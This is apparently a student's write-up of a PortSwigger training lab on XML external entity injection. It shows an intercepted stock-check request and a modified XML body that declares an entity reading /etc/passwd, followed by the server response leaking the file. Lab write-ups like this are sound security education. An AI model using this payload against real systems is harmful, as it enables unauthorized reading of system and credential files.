# Description
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

# Process
This lab took place in the same shop that is used for a number of other PortSwigger labs. It has a home page with categories and a list of products, and each product has its own page. The notable part of this is that on each site, there is a button to check the stock of the product, which will print out the number of units on the page.

First, I opened Burp and intercepted a request for the product stock. The request included a body with the following:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>11</productId>
	<storeId>1</storeId>
</stockCheck>
```
First, I thought to do exactly what was shown in the lesson. I edited the body to show the following:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xyz [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```
Surprisingly, the response to this included the `/etc/passwd` file:
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 2284

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```
This solved the lab.